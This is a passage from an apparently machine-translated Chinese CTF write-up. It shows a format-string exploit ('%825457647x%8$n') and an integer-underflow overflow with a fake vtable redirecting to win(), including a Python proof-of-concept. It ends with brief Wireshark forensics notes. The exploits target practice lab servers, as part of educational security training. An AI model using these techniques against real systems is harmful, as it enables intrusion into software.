                secretLength = load_flag( secretKey, sizeof(secretKey) );
                socket_printf( client_socket, "Today is your lucky day! Your key is: %s\n", secretKey );
                return;
            }
            else
            {
                socket_printf( client_socket, "Sorry, today is not your lucky day.\n");
            }
    
        }
        close( client_socket );
    }
    
    === snip... ===
    
    

我们首先分析提供的代码段。

我们立即将以下行标识为可能存在漏洞，因为它使用传递给snprintf的非静态格式字符串。

`snprintf( destBuffer+sizeof(RESP_PREFIX)-1,MAX_LEN-sizeof(RESP_PREFIX),socketBuffer );`

我们可以通过连接和发送多个％x来快速识别服务器是否易受攻击。  

![image.png](https://image.3001.net/images/20190822/1566460628_5d5e4ad42be67.png)  

服务器的响应包含数字而不是我们的％x。 这确认服务器包含格式字符串漏洞。

我们更多地查看提供的源代码，并查看pWinning指向的值是否针对0x31337BEF进行检查，如果匹配，则将该标志发送给我们。

知道我们可以用格式字符串写数据，我们会将pWinning指向的值调整为0x31337BEF。

我们将使用两个步骤来实现这一点，首先我们将使用％x来确定堆栈上pWinning的参数偏移量。
其次，我们将使用％x和％n格式字符将泄漏地址的值更改为0x31337BEF。

我们确定获取pWinning指针所需的堆栈弹出数，告诉我们pWinning的直接参数偏移量。 最简单的方法是向服务器发送一些堆栈弹出，每次都断开连接。
我们应该看到pWinning指针由于源代码中看到的随机数而改变。

![image.png](https://image.3001.net/images/20190822/1566461187_5d5e4d0386896.png)  

我们可以看到第8个值每次都在变化，而其他任何值都没有变化。这意味着这很可能是我们的pWinning指针及其直接参数访问偏移量是8（第8个堆栈弹出）。

此时我们可以编写一个格式字符串exploit来使用多个写操作来实现我们将*
pWinning的值设置为0x31337BEF的目标。这意味着我们必须泄漏pWinning的值并手动构建写地址。

因为这是一个CTF，时间是关键，我们只需在我们的格式字符串中使用一个兆字节，它允许我们使用二进制提供的值作为我们的写地址，它也将简化我们的格式字符串，代价是服务器资源。

我们已经知道pWinning是第8个直接参数访问变量，所以现在我们需要做的是使用％x说明符输出0x31337BEF字符，然后使用％n说明符写入第8个直接参数中的地址。
Simple.We将0x31337BEF转换为十进制并获得825457647，这是我们需要告诉我们的％x说明符输出的字节数。我们将它插入我们的格式字符串，为我们提供以下格式字符串。

`%825457647x`  

然后，我们添加一个％n说明符，将目前为止的输出字节数写入第8个直接参数中的地址（我们之前确定了这个值）。
我们不希望对输出的字节数添加任何不确定性，因此我们使用直接参数访问而不是使用堆栈弹出来到我们的pWinning地址。  

    
    
    %825457647x%8$n

我们连接到挑战服务器并传入格式字符串，它似乎挂了一段时间（这是由于服务器执行我们要求它的兆字节）然后我们得到了这个问题FairlyIdealLiver576的标志。  

![image.png](https://image.3001.net/images/20190822/1566461422_5d5e4deeb9bc4.png)  

## A Bit One Sided

    
    
    对Quick Code Ltd.提供的源代码进行审核，以识别任何漏洞。 已设置服务器，以便在192.168.0.104:21320处利用已识别的客户漏洞
    
    
    
    === snip... ===
    int g_client_socket;
    
    void win(void)
    {
        char secret_key[256] = {0x0};
    
        load_flag(secret_key,sizeof(secret_key));
        socket_printf( g_client_socket, "Success. Your flag is %s\n",secret_key);
    }
    
    void handle_client(int client_socket)
    {
        char reqData[128] = {0x0};
        CReqObj* reqObj = 0;
        short reqLen = 0;
        bool retValue;
        int recvLen;
    
        g_client_socket = client_socket;
    
        signal(SIGALRM, sig_alrm_handler );
        alarm(10);
    
        recvLen = recv(client_socket,&reqLen,sizeof(reqLen),0);
    
        if (recvLen == -1 )
            goto cleanup_exit;
    
        socket_printf(client_socket, "Got request size: %d\n", &recvLen);
    
        if (reqLen < 0 || reqLen > sizeof(reqData))
        {
            socket_printf(client_socket,"Supplied request length is invalid.\n");
            goto cleanup_exit;
        }
    
        reqObj = new CReqObj();
    
        recvLen = recv(client_socket,reqData,reqLen-1,0);
        if (recvLen == -1)
            goto cleanup_exit;
    
        reqObj->SetRequestData(reqData);
        
        retValue = reqObj->ProcessRequest(); 
    
        socket_printf(client_socket,"Better luck next time.\n");
    
    cleanup_exit:
        if (reqObj)
            delete reqObj;
    
        close(client_socket);
    
        exit(0);
    }
    === snip... ===
    
    

我们首先查看此问题提供的源代码文件。 代码片段似乎从播放器读取reqLen（2个字节）。
然后它对reqLen执行边界检查，如果它通过边界检查，则创建一个新的CReqObj对象，然后程序接收reqLen1字节。
然后它使用刚刚从播放器收到的数据调用CReqObj对象的SetRequestData函数。
然后它调用CReqObj对象的ProcessRequest函数，打印“下次好运”，删除CReqObj对象，关闭播放器套接字并调用exit（0）;我们注意到代码片段中有两个漏洞。
第一个是地址泄漏，返回指向recvLen的指针而不是recvLen的值。  

    
    
    socket_printf(client_socket, "Got request size: %d\n", &recvLen);

第二个是整数下溢。 如果我们将值0作为reqLen发送，它将通过边界检查。  

    
    
    if (reqLen < 0 || reqLen > sizeof(reqData))

但是当程序调用recv时，1将从0中减去，给出一个有符号值-1。 recv函数len参数的类型为size_t，这是一个unsigned int。
当有符号值-1传递给recv的len参数时，它被转换为unsigned
int，其中-1变为0xFFFFFFFF，因此要求recv读取最多4,294,967,295字节。
这将允许玩家向第二个recv发送超过128个字节以溢出reqData缓冲区并覆盖其他堆栈变量。  

    
    
    recvLen = recv(client_socket,reqData,reqLen-1,0)

所以我们需要确定如何利用它。 首先，我们需要考虑我们想要将程序流转移到哪里。
在代码片段中有一个名为win的函数，它将标志返回给客户端套接字，因此我们应该执行它。

其次，我们必须决定如何转移代码路径以在我们期望的win函数中执行代码。

我们不能简单地覆盖EIP，因为返回之前的退出调用会从堆栈中弹出并执行。 但是，溢出将导致reqObj对象指针被覆盖。
我们可以通过创建一个伪对象和包含函数win地址的vtable来使用这个事实来控制执行。
这样，当程序试图调用SetRequestData（reqData）时，它实际上会调用win函数。

让我们从构建假对象和vtable开始。 用C ++编译的标准对象通常看起来像内存中的下表。  

    
    
    ObjPtr > Vtable Ptr > FunctionPtr 1
    ObjVar 1 FunctionPtr 2
    ObjVar 2 FunctionPtr ..
    ObjVar 3 FunctionPtr n
    ObjVar ..
    ObjVar n
    

我们将构建一个假对象和vtable，如下所示  

    
    
    reqData > reqData+4 > win addr
    win addr
    win addr
    win addr
    

将此压缩为伪对象字符串为我们提供以下字符串格式。  

    
    
    <reqdata+4><win addr><win addr><win addr><win addr><win addr><win addr><Padding to
    128Bytes><reqdata><reqdata><reqdata><reqdata><reqdata><reqdata>
    

我们将第一部分填充到128字节以填充reqdata缓冲区并确保我们的对齐正确。

请注意，我们在字符串的末尾使用了多个reqdata地址条目，因此我们不必确定reqObj对象指针和堆栈上的reqData之间的字节数。
只要我们记得4字节对齐我们的值，我们应该没问题。

现在我们开始确定我们需要替换为伪对象字符串的值。

我们使用objdump在提供的二进制文件中找到win函数的地址。 名称周围的额外数据只是编译器应用的名称修改。  

    
    
    #> objdump x efed50a053ba74f8***794d2690ecaf3exp03 | grep win
    080490e1 g F .text 00000060 _Z3winv
    00000000 F *UND* 00000000 _Unwind_Resume@@GCC_3.0
    

我们将win函数的地址放入我们的exploit字符串中，注意由于字节顺序而反转字节。  

    
    
    <reqdata+4>\xe1\x90\x04\x08\xe1\x90\x04\x08\xe1\x90\x04\x08\xe1\x90\x04\x08\xe1\x9
    0\x04\x08\xe1\x90\x04\x08<Padding to
    128Bytes><reqdata><reqdata><reqdata><reqdata><reqdata><reqdata>
    

现在我们需要确定reqData的内存地址。 我们可以通过获取上面确定的recvLen的地址泄漏并将其偏移以获取reqData的地址来实现此目的。

我们使用netcat连接到服务器并发送一些数据以获得“获取请求大小：”提示。 仅在重新启动服务时，才会在连接之间进行更改。
注意：您泄露的地址会有所不同，因此您必须考虑到这一点。

![image.png](https://image.3001.net/images/20190822/1566462053_5d5e5065ec975.png)我们获得了recvLen的地址1077759292。
我们使用bash将它从有符号整数转换为无符号整数。  

![image.png](https://image.3001.net/images/20190822/1566462604_5d5e528ca9c23.png)  

因为它是32位目标，我们可以忽略前四个0xFF字节。 这将recvLen变量放在地址0xbfc2b2c4。

POC

    
    
    import sockct
    import re
    import struct
     
    sock = socket.socket()
    print "Connecting..."
    sock.connect(('192.168.1.64', 21320))
    sock.send("\x00\x00")
    buff = sock.recv(64)  # Got request size...
     
    address = int(re.search(r"\d+", buff).group(0))
    if "-" in buff:
        address = 2**32 - address
    print "Address of recvLen is", hex(address)
     
    win = 0x080490e1
    reqData = address - 128
    vtable = reqData + 8
     
    payload =  struct.pack("I", vtable)
    payload += struct.pack("I", 0)
    payload += struct.pack("I", win)
    payload += struct.pack("I", win)
    payload += struct.pack("I", win)
    payload += struct.pack("I", win)
    for i in range(28):
        payload += struct.pack("I", 0xdeadbeef)
    payload += struct.pack("I", reqData)
    payload += struct.pack("I", reqData)
    print "Sending payload..."
     
    sock.send(payload)
    buff = sock.recv(1024)
    print buff
    sock.close()
    

![image.png](https://image.3001.net/images/20190822/1566462574_5d5e526ed4de1.png)  

# Shellcode

这一章不会，跳过=-=

  

# Network Forensics

## Not Enough Magic

    
    
    您已经获得了以下网络捕获，其中提到了嫌疑人以前隐藏的信息，但基本上是这样。 分析网络捕获以恢复嫌疑人隐藏的标记。
    

让我们首先下载并打开Wireshark中提供的pcap文件并执行快速分析。

查看协议层次结构统计（统计>协议层次结构），我们可以看到pcap中的所有流量都是HTTP over TCP。

![image.png](https://image.3001.net/images/20190822/1566474853_5d5e8265415a2.png)  

要找出实际的HTTP请求是什么，我们将过滤器设置为“http”。 这仅向我们显示了重新组合的http请求和响应，而不是显示构成它们的各个数据包。

查看第一个GET请求的响应的未压缩主体（数据包No 15），我们可以看到它包含一个包含几个文件的目录列表。 其中列出了许多这些文件，随后下载目录列表。

我们使用Wiresharks导出对象功能（文件>导出对象> HTTP）从此pcap中提取下载的文件并保存所有文件。

现在我们已经从pcap导出了所有HTTP对象，我们将在它们之间运行file命令以快速了解它们的内容。

![image.png](https://image.3001.net/images/20190822/1566474900_5d5e829489eaa.png)在这里文件里面找到了flag

![image.png](https://image.3001.net/images/20190822/1566474986_5d5e82ea05114.png)  

## Notwork Forensics

    
    
    您已获得两名涉嫌犯罪分子之间交换的网络捕获文件。 分析会话和传输的文件以恢复嫌疑人标志。
    

## AYBABTU

    
    
    RL Forensics Inc.已经从其中一个感染了木马恶意软件的客户那里获得了网络捕获。 客户能够捕获与犯罪分子服务器通信的木马的命令和控制会话。 他们想知道犯罪分子窃取了哪些数据。 分析通信，确定自定义协议并提取被盗信息以显示标志
    

  

